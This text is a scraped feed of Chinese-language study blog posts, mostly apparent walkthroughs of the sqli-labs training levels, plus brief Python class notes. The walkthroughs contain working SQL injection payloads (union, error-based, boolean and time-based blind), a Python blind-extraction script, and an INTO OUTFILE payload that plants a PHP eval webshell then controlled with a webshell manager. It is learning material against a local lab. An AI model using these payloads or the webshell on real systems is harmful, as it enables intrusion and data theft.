按照索引赋值__getitem__ 按照索引获取值__len__ 获得长度__cmp__ 比较运算__call__ 函数调用__add__ 加运算__sub__ 减运算__mul__ 乘运算__div__ 除运算__mod__ 求余运算__pow__ 称方 参考:https://blog.csdn.net/brucewong0516/article/details/79114977 class的属性例： 1234567891011class person(): tall = 180 def __init__(self,name,age,weight): self.name = name self.age = age self.weight = weight def infoma(self): print('%s is %s weights %s'%(self.name,self.age,self.__weight))person = person('bruce',25,60)infoma = person.infoma() 数据属性数据属性分为类数据属性和实例数据属性 类数据属性：就是上面的tall，可以被添加 123456789101112131415class person(object): tall = 180 hobbies = [] def __init__(self, name, age,weight): self.name = name self.age = age self.weight = weight def infoma(self): print('%s is %s weights %s'%(self.name,self.age,self.weight))person.hobbies.extend([&quot;football&quot;, &quot;woman&quot;]) #类数据属性属于类本身，可以通过类名进行访问/修改，此处添加&quot;football&quot;、&quot;woman&quot;两个print(&quot;person hobbies list: %s&quot; %person.hobbies ) # class can add class attribute after class definationperson.hobbies2 = [&quot;reading&quot;, &quot;jogging&quot;, &quot;swimming&quot;] #在类定义之后，可以通过类名动态添加类数据属性，新增的类属性也被类和所有实例共有print( &quot;person hobbies2 list: %s&quot; %person.hobbies2 ) print( dir(person)) 特殊的类属性：对于所有的类，都有一组特殊的属性 _ _ name_ _：类的名字（字符串）_ _ doc _ _ ：类的文档字符串_ _ bases _ _：类的所有父类组成的元组_ _ dict _ _：类的属性组成的字典_ _ module _ _：类所属的模块_ _ class _ _：类对象的类型 实例数据属性：例如name，只能通过实例访问 1234567891011Bruce = person(&quot;Bruce&quot;, 25,60) #实例数据属性只能通过实例访问print (&quot;%s is %d years old&quot; %(Bruce.name, Bruce.age) )# class instance can add new attribute # &quot;gender&quot; is the instance attribute only belongs to wilberBruce.gender = &quot;male&quot; #在实例生成后，还可以动态添加实例数据属性，但是这些实例数据属性只属于该实例print( &quot;%s is %s&quot; %(Bruce.name, Bruce.gender) ) # class instance can access class attributeprint( dir(Bruce))Bruce.hobbies.append(&quot;C#&quot;)print (Bruce.hobbies) 对于类数据属性和实例数据属性，可以总结为： 1.类数据属性属于类本身，可以通过类名进行访问/修改2.类数据属性也可以被类的所有实例访问/修改3在类定义之后，可以通过类名动态添加类数据属性，新增的类属性也被类和所有实例共有4实例数据属性只能通过实例访问5在实例生成后，还可以动态添加实例数据属性，但是这些实例数据属性只属于该实例 小结这里主要知道什么是类数据什么是实例数据，加深对类这一个概念的理解 参考：https://blog.csdn.net/brucewong0516/article/details/79118703 class的访问控制1、单下划线”_”在Python中，通过单下划线”“来实现模块级别的私有化，变量除外。一般约定以单下划线””开头的函数为模块私有的，也就是说”from moduleName import * “将不会引入以单下划线”_”开头的函数。现在有一个模块 example_example.py，内容用如下，模块中一个变量名和一个函数名分别以”_“开头： 2、双下划线”__”1.对于Python中的类属性，可以通过双下划线”__“来实现一定程度的私有化，因为双下划线开头的属性在运行时会被”混淆”（mangling）。 2.双下划线的另一个重要的目地是，避免子类对父类同名属性的冲突 吐槽:学的很无语，因为看的不是很懂，感觉懵懵的== https://blog.csdn.net/brucewong0516/article/details/79121179","link":"/2021/02/27/python%E7%B1%BB%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"},{"title":"solidity智能合约学习","text":"","link":"/2021/05/01/solidity%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AD%A6%E4%B9%A0/"},{"title":"sqli-labs小试","text":"这个是第二次写这篇博客，我没想到居然忘记保存了，泪目。。 sql注入首先我觉得可能要先理解一下什么是sql注入sql注入 指的是，web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序事先定义好的查询语句的结尾添加额外的SQL语句，在管理员不知情的情况下事先非法操作，以此实现欺骗数据库服务器执行非授权的命令。 sql注入的类型1.字符型注入2.数字型注入 这是一个写到第三关的补充我在想为什么加入一个单引号或者‘）就可以实现注入，就可以进行操作，在思考一番过后，我发现是这样的：就拿第一关来说吧 当我输入的是?id=1’的时候，看这个错误代码： 12 use near ''1'' LIMIT 0,1' at line 1SELECT * FROM users WHERE id='1'' LIMIT 0,1//这个是我在文件里面加入的提示sql执行的语句 当我输入and1=1后 可以发现他的错误提示是 12 use near 'and1=1' LIMIT 0,1' at line 1SELECT * FROM users WHERE id='1'and1=1' LIMIT 0,1 这里是来自第23关的一个更正1所以就又重新思考了一下，加上资料查找：闭合指的是双引号成对存在，所以我们看上面的语句 当我们加入了一个引号的时候，此时的引号一共是有五个的，所以必然存在一个多余的单引号，那么我们需要去掉哪个引号才不会影响我们的语句呢？ **2.**注释符 会将后面所有内容给注释掉 ,,,所以在这个语句中’’2’and1=1’ LIMIT 0,1’，我们先解析一下， 首尾各有一个引号，切2前面和1后面各有一个引号，这个是’$id’ 在源码中出现的两个引号，而首尾的引号是后来出现的，我们在2后多加了一个单引号后，导致引号之间不配对了，所以出现错误，这个时候我们需要将1后面的单引号，limit，这样2前面的单引号就和我们的插入的但引号配对成功了那么当然也有不注释的方法：就是让所有的引号都找到自己的另一半，也就是说我们在这里多加一个单引号就可以了**1.**这边有几个问题需要说一下，引号内的数据要合法，要保证连贯性，他前后是可以互相拼接的比如’=1’就不行，还有就是引号的闭合好像是有就近原则，我刚才试了一下 发现 ‘1’and 1=1’’这个就不行，可能是因为 最后两个引号直接无数据导致出错了，然后两个引号之间闭合，引号的内容会变成字符串，所以这个时候我们就无法使用order by 来查询字符段数目。因为order by需要的是数字，这个时候我们直接使用 union select尝试即可。 这是来自后面的复习，如果要参考的看这个就够了关于单引号，我们知道 我们输入1’代入到select查询语句是这样的： SELECT * FROM users WHERE id=’1’’ LIMIT 0,1注意到1后面多了一个’，此时 是不符合语法的，因为有个单引号落空了。所以这个时候我们就有两个方案1.注释掉后面的单引号 这里以#作为演示：SELECT * FROM users WHERE id=’1’#’ LIMIT 0,1此时这个语句在mysql里面是这样SELECT * FROM users WHERE id=’1’#去执行的，因为后面都被注释掉了，这个时候就符合语法，后面可以加入其它语句了再举个例子，以union联合注入为例:SELECT * FROM users WHERE id=’1’union select database()#’ LIMIT 0,1 代入到mysql是这样的:SELECT * FROM users WHERE id=’1’union select database()# 2.闭合后面单引号SELECT * FROM users WHERE id=’1’or1=1’1’ LIMIT 0,1 这个语句也是符合语法的 代入到mysql是这样的:SELECT * FROM users WHERE id=’1’(查询id=1) or 1=1(这是执行了一个永恒为真的或语句) ‘1’(输入了一个1) LIMIT 0,1 less11.根据这个题目中的get-error based-single quotes，我们就可以知道这题是单引号引起的字符型输入，所以我们直接输入?id=1。2.接下来我们输入一个单引号’3.可以发现，网页开始报错了内容是 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1SELECT * FROM users WHERE id=’1’’ LIMIT 0,1 在这个当中单引号被包括进去了，但是却报错了，而当我尝试其他符号的时候，发现是可以正常显示的。接着我们用and 1=1 和and1=2来测试， 这里补充一个知识点， and 1=1代表永恒为真， and 1=2 代表永恒为假 我们判断有没有注入的时候可以利用这点来判断，如果页面不一样，就代表我们的语句生效了，存在注入点! 接下来我们需要知道查询表的字段数，我们才能利用union+select查询我们所需要的信息因为 select （），（），（）， 有几个括号是要和该表的字段数所对应，在这里我们需要引入一个order by命令在这里 order by 的作用是用来查询字段数，当你order by （一个数字）的时候，如果有这么多字段数，那么输出结果就不会报错，如果没有，就会报错而我们通常会将order by 结合二分法这个时候就可以很快的查询到字段数（核心是猜） 知道字段数吼，并且知道我们就可以利用注入点，添加一些命令语句，获得我们想要的信息。 然后这里需要了解一个union命令 ： 两个要联合的SQL语句 字段个数必须一样，而且字段类型要一致 这个union命令可以拼接语句，使得将两个select语句联合起来使用，这个时候我们可以让前面那个select为假使用不了，这样后面的语句就可以使用了。 这个时候使用 ?id=1’ and 0 union select 1,2,3 –+ 就可以发现页面变成 这个样子，说明字段2代表的是登录名一栏，字段3代表的是密码一栏 接下来，我们要做的就是让可以显示的这几栏我们想要的信息： 当我们输入select 1,database (),3 –+的时候 我们就可以得知其中数据库的名字，为security 紧接着，我们就可以再利用select 查询这个库名里面的表名接下来我们在union后面添加 select 1,group_concat(table_name),3 from information _schema.tables where table_schema =’security’ –+ 那这个时候 就出现了这个数据库中的所有表名， 接下来我们知道了库名，知道了表名，就可以去找表中的字段名了差找字段名的语句是这样的 select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and table_name=’emails’–+也可以直接是 select 1,group_concat(column_name),3 from information_schema.columns where table_name=’emails’–+ 根据这段语句，我们就可以获得emalis这个表中的字段名 含有一个id 一个email_id 这个时候我们就爆一下字段名 这个时候我们使用 select 1,email_id,3 from emails –+ 就可以知道这个字段名下的数据 这样就大功告成了 这个时候补充一些知识：mysql5.0版本之后 会在数据库中存放一个information_schema的数据库，在该库，我们需要记住三个表名，分别是schemata，tables，colums 在schemata表中存储该用户创建的所有数据库的库名，在该表中 记录数据库库名的字段名为：schema_name tables中存储该用户创建的所有数据的库名和表名，在这个表中记录数据库库名和表名的字段名分别为 table_schema和table_name columns表存储该用户创建的所有数据库的库名，表名和字段名，在该表中记录数据库库名，表名和字段名的字段名为table_schema,table_name,column_name; group_concat（）函数功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。 在我们这题中我们是用group_concat(column_name)意思是将这个表中所有字段名连接起来并返回数据。https://www.cnblogs.com/wang-yaz/p/10862627.html这个是参考链接","link":"/2020/10/24/sqli-labs%E5%B0%8F%E8%AF%95/"},{"title":"sqlilabs 3","text":"LESS-7 在这题当中，我们不难发现，这次他是对((‘$id’))做了这个处理，所以我们只需要在后面多加一个’))这个 然后在里面添加我们需要注入的语句就可以进行注入了 好了 成功执行，接下来我们输入我们的查询语句试试 因为之前都知道他的数据库名字是security 所以我直接用substr查了，然后如果换成其他的他就会报错，好像接下来也没啥太大区别了？ OK 一模一样，但是我看外面那个标题 和其他的也不一样啊， 是叫做DUMP into outfile 即利用文件导入的方式进行注入（文件上传注入）原来这么快就要使用webshall 了：安装好webshall以后，https://blog.csdn.net/qq_34965596/article/details/104076019?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-7.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-7.add_param_isCf这个是webshall的简单使用教程 我们开始使用这个文件导入的方式进行注入：基础知识：1.如果服务端代码卫队客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）危害：非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被成为webshell，也可将webshell脚本成为一种网页后门，webshell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件、执行系统命令等。今天就先简单的使用一下select into outfile 直接写入1.利用条件（1）对web目录需要有写权限能够使用单引号（root）（2）知道网站绝对路径（这次由于网站直接搭载在本机下，所以可以很容易得知）（3）secure_file_priv 没有具体值2.查看secure_file_priv值secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限。当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权我发现我的secure_file_priv是有值的 所以我就找到ini配置文件https://blog.csdn.net/believe_today/article/details/79223684 这个是查找教程 然后将那个数值删掉 记得重启mysql，不然没用接下来就是使用 1union select 1,2 ,&quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into outfile 'D:\\\\apache\\\\www\\\\sqli-labs-php7-master\\\\Less-7\\\\123.php' --+ 有个需要注意的点1这边的斜杠是两个。在输入这段代码以后 出现了这两个即使报错了 文件依旧生成了接下来就是利用菜刀工具，连接这个木马，控制文件 配置是这样的 这个连接密码是那个php一句病毒的post里面的字符 点击添加即可（PS:我一直按测试连接，一直说返回值为空，我人傻了） 然后添加完以后，右键那个 点击文件管理 OK 打开新世界的大门 这里需要补充一下，接下来回到刚才添加地址的那个页面右键单击我们添加的地址，然后按数据管理，然后点击数据库，输入这些信息，记得！！！！数据库类型是mysqli（分版本的）ok好了 数据库 一览无遗 攻击成功 补充知识：1.PHP一句木马是这样的 eval()：eval函数将接受的字符串当做代码执行参数情况： （1）如果参数是一个表达式，eval() 函数将执行表达式； （2） 如果参数是Javascript语句，eval()将执行 Javascript 语句；注意：（如果执行结果是一个值就返回，不是就返回undefined，如果参数不是一 个字符串，则直接返回该参数）语法：eval(string)案例：eval(“var a=1”);//声明一个变量a并赋值1。eval(“2+3”);//执行加运算，并返回运算值。eval(“mytest()”);//执行mytest()函数。函数作用域：eval()函数并不会创建一个新的作用域，并且它的作用域就是它所在的作用域，有时候需要将eval()函数的作用域设置为全局，当然可以将eval()在全局作用域中使用，这个时候可以用window.eval()的方式实现。 1234&lt;?php @eval($_POST['hacker']);?&gt; //解析一下这句话：hacker是密码，通过post提交数据，$_POST是超全局变量//@符号的意思是不报错//在写语句的时候注意 ?&lt;php 这三个之间无空格 //密码有无引号问题不大 将这个一句话木马写入文件上传到网站，然后打开这个这个函数好像还有其他东西没被我想到，有点怪怪的？？？ 感觉没这么简单 所以重新开了个博客整理这个文件上传注入的知识 2.webshellweb 应用管理工具，正常情况下，运维人员可以通过 webshell 针对 web 服务器进行日常的运维管理以及系统上线更新等，那么攻击者也可以通过 webshell 来管理 web 应用服务器。 法2也可直接将数据库的数据存到文档中 LESS-8在这个当中我们 发现他是没有报错信息的 那么我们就无法使用类似之前的报错注入了。所以就需要时间注入攻击这里我们就需要先了解一个sleep（）函数它的功能是可以让mysql的执行时间变长一班和if（expr1，expr2，expr3）结合使用，此if语句含义是：如果expr1是true 则if（）的返回是expr2，否则则返回的值为expr3。所以这里我们输入 1if（length(database()&gt;1),sleep(5),1) 这个语句的意思就是，如果数据库名称的长度大于1,那么延迟五秒钟响应，反之查询1那么我们怎么知道他的响应时间呢火狐浏览器 然后按网络即可 那接下来就是查询表的名字 1and if(substr((select table_name from information_schema.tables where table_schema='security'limit 0,1 ),1,1) = 'e',sleep(5),1) --+ 接下来的步骤都很相似了 第九关这个关和第八关还挺像的，但是这关连报错都没有，都是you are in 那这个时候 很明显就只能利用时间来判断是否注入了 因为不管是 and 1=1 还是 and1=2 画面都不会有变化，因为报错语句已经全部变成you are in了 一样的代码一样的测试结果，后面就不再截图了 用就是最后查询字段内容了 第十关根据标题 double quotes可以知道这次需要使用双引号的注入 然后再加上时间盲注 那其他过程都和之前的一样 整理时间盲注代码： 1234 and if(substr(database(),1,1)='s',sleep(5),1) --+and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',sleep(5),1) --+and if(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)&gt;'e',sleep(5),1) --+and if(substr((select email_id from emails limit 0,1),1,1)='D',sleep(5),1) --+ 说几个需要注意的点吧，首先 是空格一定要在英文模式下打，其次 括号要分清几个，然后比如说我们要找字段名 就是column_name 而column_name 是从表中也就是table_name里面找到的 这个要理解一下，不然一直记错很难受 附python时间盲注脚本: 1234567891011121314151617import requestsimport datetimes=requests.session()url=&quot;http://localhost:81/sqli-labs-php7-master/Less-9?id=1&quot;payload_try='0123456789abcdefghijklmnopqrstuvwxyz'passwd=''for i in range(1,9): for j in payload_try: payload=f&quot;'and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{i},1)='{j}',sleep(1),1)--+&quot; print(payload) time1=datetime.datetime.now() r=s.get(url+payload) time2=datetime.datetime.now() sec=(time2-time1).seconds if sec&gt;=1: passwd+=j print(passwd)","link":"/2020/11/16/sqlilabs-3/"},{"title":"sqlilabs1","text":"在第二关中 我首先用and 1=1 和and1=2 得到的结果是不一致，说明我们的语句可以被注入使用,也即存在注入点： 接下来我们就要利用这个注入点输入语句了 这个是我们加个‘发现是和上一题是不一样的 输入单引号，根据报错信息确定咱们输入的内容被原封不动的带入到数据库中，也可叫做数字型注入， 这个时候我们发现第二关相比第一关少了一个单引号，所以我们这题我们就无须加单引号，直接写查询代码就可以了（看看我们上面执行的and其实也就可以知道了） 这个时候我们还是用order by 查询他的字段数，可以发现，依旧为3；然后我们使用union联合select 在这里发现一个神奇的事情，是不是用–+注释掉后面都可以，没啥区别 这边有一点我需要再明确的：我们是先获得数据库database()的名字，在通过数据库的名字后查询表名table_name，再知道表名之后，查询字段名column_name后面和前面的第一关是很类似的，就不详细说 接下来是第三关当我输入and 1=1 或者是 and1=2的时候，页面没有任何区别，所以这个和第二关不太一样，此时我们再尝试一下输入单引号 页面变成如下 从错误报告中我们可以知道 12use near ''1'') LIMIT 0,1' at line 1SELECT * FROM users WHERE id=('1'') LIMIT 0,1 这个时候我们发现 在输入单引号后，后面多了一个括号， 我们把use的那条补充完整，应该是use near ‘(‘1’’) LIMIT 0,1’ at line 1这个时候我们可以推测出这次的程序如果要执行代码应该是要（’执行内容’），所以我们尝试一下在’后面加一个括号，让整个语句变成use near ‘(‘1’)’ ‘) limit’ **让我尝试一下 发现他是变成这样的：use near ‘’) LIMIT 0,1’ at line 1 就像我在第一关说的，（’1’） 因为已经是合法数据，所以就没出现了，符合我的猜想，我一开始说要执行代码需要（’内容’）这个格式，所以我接下来便输入了：?id=1’)(‘and1=1’) 并且无论是否加 –+ 都是错误的，所以我就纳闷啊，为啥呢，后来发现是要（’’）这个形式没错但是，我们将语句还原回去一下use near ‘(‘(‘1’)and1=1’)’** 此时我们就可以发现其实and1=1 是（’’）这个形式了在后面加上注释符，即可 此时我们发现，存在注入点，接下来就和前两题应该没什么区别了吧让我尝试一波此时有点小无语，因为没有让前面的id为假，导致我一直输出dumb，我还在想哪里出错了，无语了和之前的没啥区别，就不说了哈哈哈哈补充一下就是 一开始的group_concat(column_name) 这边这个table或者column是不用加s的，需要加的是information_schema.columns这边需要加，这一整个语句中就是这里需要加。好像也没啥要写的，如果有的话再来补充吧 第四关这个前四关都一模一样啊，我本来想第四关重新写一篇博客水一下，可是一看到题目就知道跟前三篇几乎一模一样吧？唯一不同的是这次是双引号” 确实一模一样，没啥好说的","link":"/2020/11/07/sqlilabs1/"},{"title":"sqlilabs2","text":"sqlilabs第五关这次的和之前四关就很不一样了，虽然还是单引号的字符型注入，但是 这个you are in 就很尴尬，除了报错，不然都是you are in。。。。所以要怎么办呢这个时候就要知道什么叫盲注了 盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显 到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注 盲注有三类•基于布尔 SQL 盲注•基于时间的 SQL 盲注 •基于报错的 SQL 盲注先从布尔sql盲注说起吧 首先是sql注入截取字符串常用函数首先是mid（）函数此函数为截取字符串的一部分语法：MID（column_name,start,[length]） eg： str=”123456” mid(str,2,1) 结果为2 例子： （1）MID(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。 （2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。 substr()函数 Substr()和substring()函数实现的功能是一样的，均为截取字符串。string substring(string, start, length)string substr(string, start, length)参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。例子：(1) substr(DATABASE(),1,1)&gt;’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)&gt;’a’此处string参数可以为sql语句，可自行构造sql语句进行注入 Left()函数 Left()得到字符串左部指定个数的字符 Left ( string, n ) string为要截取的字符串，n为长度。 Sql用例： (1) left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。 (2) 同样的string可以为自行构造的sql语句。 同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。 例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’资料来源：https://www.cnblogs.com/lcamry/p/5504374.html length()函数可以用来判断字符数eg：length(database())&gt;5,这个数据库的名称是否大于五个字符资料先放着吧，感觉还是要运用了记忆力会比较深然后回到题目来：此时我们使用length判断数据库名称的长短使用指令and length(database())&gt;=8 画面返回 但是当我 为and length (database())&gt;9的时候 返回了这玩意，说明是错的，也就是这个数据库的字符数是8，想一下我就觉得是security。我们接下来去试试 方法一substr((string, start&lt;,length&gt;) 这里有一种方法是利用 substr(database(),1,1)=’s’ 这个函数来一个个试 发现是可以的，说明第一个字母就是s，然后接下来继续去试，发现就是security 方法2这里有一种方法是利用burp suite工具：下面是学习过程 proxy 和代理相关 intercept截断默认Intercept is on 按钮出于开启状态 也就是说默认代理截断功能是打开的.此时所有的请求都会被截断,只有手动Forward之后请求才会被发出去 Http history(http请求历史)所有经过burp suite 的请求 都会被记录到http history中. 上面是请求概要信息 下面是请求详细信息 websookets history有的web时没有界面的，是用一个长链接 类似于api的方式来传输数据 burp suite也是可以截获这类信息的api是一个通道，是一个接口，负责一个程序和其他软件的沟通，本质是预先定义的函数，就是类似于预设。 options（配置选项）Proxy Listeners(侦听端口设置) 点击next 就会生成一张证书 选择路径保存. 然后导入到浏览器,就可以实现https的访问 资料来自：https://www.cnblogs.com/php09/p/10412687.html 学习博客：https://blog.csdn.net/qq_35544379/article/details/76696106 弄这个弄得我想吐，我在抓sqlilabs的本地包的时候，一直抓不到 ，我以为是burp的问题，原来是浏览器的问题，人傻了，我试了几个方法，好像修改火狐浏览器的一个高级选项是最有效的，这样你使用localhost输入的时候也可以抓到了 我发现一件事，我再用 1?id=1'and substr(database(),1,1)='s' --+ 这个语句的时候，我就在想，我首先知道这个数据库的名称有多长，然后对每个字母单独加一个burp里面的变量符，这样，我是不是就免去了一个个去试的麻烦呢？接下来验证一下根据前面我的做题，我们知道，这个数据库名字的长度肯定是8个字符 首先是这样 然后 先clear 再分别对每个a进行add 我发现这个方法是不行的，但是我的思路是OK的，因为我发现他有另外一个功能，我接下来直接放图就一目了然了 就这样，然后点击star attack就可以，但是我发现这个add from list中选择8个字母好像没有所有排序，所以。。。。。可能还有更好地方法？，那反正这一步大概就是这样了接下来是判断他的库名：库名其实还是要使用substr来判断他的库名 其实就是在前三关查询的基础上 加了一个substr 语句是这样的 1' and substr((select table_name from information_schema.tables where table_schema='security'limit 0,1 ),1,1) = 'e' --+ //这边有一点需要说明的是为什么需要加这个limit 0,1 我们知道一个库中可以有很多表，按我的理解是，你如果没有加这个limit0,1 那么数据库以为你要查询的数据数每个表的，也就是说这个语句变成，每个表的第一个字母是e，而不是我们想要的，第一个表的首字母为e。 这边补充一下limit n,m的功能和意思limit的使用格式为limit m,n，其中m是指记录开始的位置，从0开始，表示第一条记录，n是指取n条记录例如：limit 0,1 表示从第一条记录开始，取一条记录，在上面那个语句中的意思就是，从第一个表开始取，去一个表的名称 localhost:81/sqli-labs-php7-master/Less-5/?id=1’ and substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1)=’e’ –+然后根据之前的经验就是emails 其实也没啥太大区别，后续就是替换substr当中的语句，替换为select column_name from information_schema.columns where table_name =’emails’ 还有什么一个字符的就不多说了。其实不一定要用substr 还有其他很多命令，我在下面的关卡看看能不能使用，不能使用的话，后续再整理 第六关确实和之前一样，但是这边是双引号的报错解题思路和上一次一样，这次我们换换其他指令看看效果：我去查了一下 报错函数是否都需要加and 我是没找到具体说明，但我看每个在使用的时候都有加一个and的接下来我们先用left其实和substr也差不多，不过 left是规定从左边起，而substr还能规定从哪里开始从哪里结束记代码一样打一下","link":"/2020/11/09/sqlilabs2/"},{"title":"sqlilabs4","text":"第十一关这里开始进入post注入，首先我们需要知道，post是向服务器提交数据 一开始是从需要从这里输入账号密码做完之前的题目 其实就有感觉就是，你输入的东西、比如id、password之类的 最后都会转换成sql语言并发挥作用，在第一关中，我们使用了单引号，并且截图进行分析，而在这一关我们也是如此 在这个当中，我看出 我们的语句好像可以跟之前一样，在1后面的''这两个引号里面似乎可以注入我们想要的命令但其实不行 输出的确实这样一个语句，这个时候就很奇怪了，为什么单引号里面的内容不会被执行呢？ 我们再来对比一下他和第一关的源码 我吐了啊 其实有个很关键的点是，现在我们在这里输入 –+注释功能，其实已经是不起作用的了所以上面为什么不会执行就是因为这个这个原因 ！！！！！！！！！所以这里我们只需要输入–(空格), 或者# 即可注释掉后面的语句 这样就可以了 我的天哪，我对自己太无语了 这里整理一下注释的知识点注释手段1mysql的注释有4 种 ： “#” ： # 开头到行尾的都为注释，只能注释一行 “– ” （2个减号 一个空格） ： – 开头到行尾都为注释 ， 只能注释一行 “/* xxx /“ : 可以注释多行，但是一定要闭合，不然出错 ”/! 数字 代码 */“ : 可以跨行注释，但是一定要闭合，不然出错。2在浏览器url中，#是用来知道浏览器动作（例如锚点），对服务器端没有效果。可以用 # 的url编码 即%23代替。在浏览器中，url中的+解析为空格。在myslq中，–’ 是的 – 与 单引号 连接在一起，不能形成正确的sql语句，而 –空格 则可以。所以在浏览器的url中用 –+ 或–’使服务端能够正确注释sql语句所以 +针对的是在url中的注释！！！ 老规矩 order by 查字段数 字段数是2 所以 接下的操作就很明确了 接下来就是巩固一下代码的记忆了 接下来是第12关第十二关 我们 无论输入单引号还是括号都无反应，都没有报错，所以我直接输入了双引号，出现这个报错，所以很明显 我们需要双引号加括号来闭合后面语句，并在其中注入我们的查询语句 第十三关这个关卡其实就是需要盲注了，因为登录成功以后，他是没有登录信息的 接下来就是先布尔盲注 那就是看有无报错这里我在使用burp suit暴力破解试试发现那个密码字典里面没有emails这个名字，所以就没成功，我觉得可以去找一些字典过来。 然后这里引入一个新函数updatexml:作用：改变文档中符合条件的节点的值，需要注意的是 ，我们在注入中使用这个语句是加了select的，所以并没有对真正的数据进行修改，而是在内存中将取出的数据进行修改然后返回给用户注意：这个这个函数是针对xml文件进行修改的，然后我们数据库的内容基本上是存放在这个xml文件中的语法：updatexml(xml_document,xpath_string,new_value)第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据 实例select updatexml(1,concat(‘‘,(SELECT database()),’‘),1) – 结果是看报错 是XPATH报错，并且 输出的报错信息，是我们那个concat拼接部分的内容。 使用理解：对于这个函数，我想了一下，大概是这样的，updatexml是一个修改函数，他的语法是UPDATEXML (XML_document, XPath_string, new_value); 我们知道中间那个XPath_string是需要符合xpath格式的，所以当我们注入的格式不符合xpath他就会报错，而updatexml（）报错信息是特殊字符、字母以及之后的内容，为了前面后面字母丢失，开头结尾连接特殊字符~， 这样就只有中间我们的查询语句是以结果的形式报出，而且报错的内容是将我们的语句转化过后的后面我又将‘’里面的内容替换了一下，都是会原样输出的，但是如果是字母 则会表现无错，说明这个是合法的，那下次在使用这个语句注入的时候干脆都用字符吧， 第十四关我们就使用extractvalue（）这个函数试试作用：对XML文档进行查询的函数格式extractvalue(xml.frag,xpath_expr)共同点和updatexml的共同点是报错原理：Xpath格式语法书写错误的话，就会报错并且报错的内容也是引号内的，如果是命令则会直接转化直接上操作： 使用 extractvalue(1,concat(‘‘,(select database()),’‘)) – 接下来就大同小异了。 小结：其实我们使用的这两个函数，都是利用他的报错会将我们的命令语句识别，并输出我们需要的信息。 第15关这一关没有输出报错信息，所以我们输入 ‘and1=1 – 和’and1=2 – 发现结果其实是不一样的，所以我们可以知道单引号注入。没有报错信息，意味着我们需要时间盲注：admin’ and if(substr(database(),1,1)=’s’,sleep(5),1) – 和之前的也没多大区别哈哈 第十六关是双引号加括号的 小结一下：到现在为止遇到的注入点好像就是只有or 1=1–+ 1.’and 1=1–+ 2.”and 1=1–+ 3.)and 1=1–+ 4.’)and 1=1–+ 5.”) and 1=1–+ 6.”))and 1=1–+ 关于闭合问题的链接https://blog.csdn.net/qq_36896220/article/details/94129125 补充知识：在看源码的时候注意到有一个isset()函数作用用于检测变量是否已设置并且非NULL","link":"/2020/11/19/sqlilabs4/"},{"title":"sqlilabs5","text":"第十七关这一关和其他的就不太一样，比如说标题是update query所以这里 我们需要修改表中的数据修改表中数据我们使用的是 update语法是：update test set sex=female;//所有员工性别更改为女性update test set sex = female where name =’zhangsan’;//更改张三这个员工的性别 看了下这题的是这样的 当我在username里面随便输了admin 他就说我成功的更改了我的密码，再结合源码，猜测这里是 在我输入账号以后，他会连接到存放我这个账号的字符段，然后将那边的密码更换成我现在输的 然后，在username无论我输那个单引号的何种组合情况，都没有反应，结合源码，我发现这里有个PHP的安全命令 **addslashes()与stripslashes()函数** 这边自定义了一个函数 check_input函数，里面出现了substr、get_magic_quotes_gpc、stripslashes这几个函数： get_magic_quotes_gpc()函数get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开当magic_quotes_gpc打开时，所有的’(单引号)、”(双引号)、(反斜杠)和NULL(空字符)会自动转为含有反斜杠的溢出字符。所以我们在账号一栏输入的单引号等的数据没有效果的原因就在这里 addslashes()与stripslashes()函数addslashes(string)函数返回在预定义字符之前添加反斜杠\\的字符串： 单引号 ’ 双引号 “ 反斜杠 \\ 空字符 NULL 该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 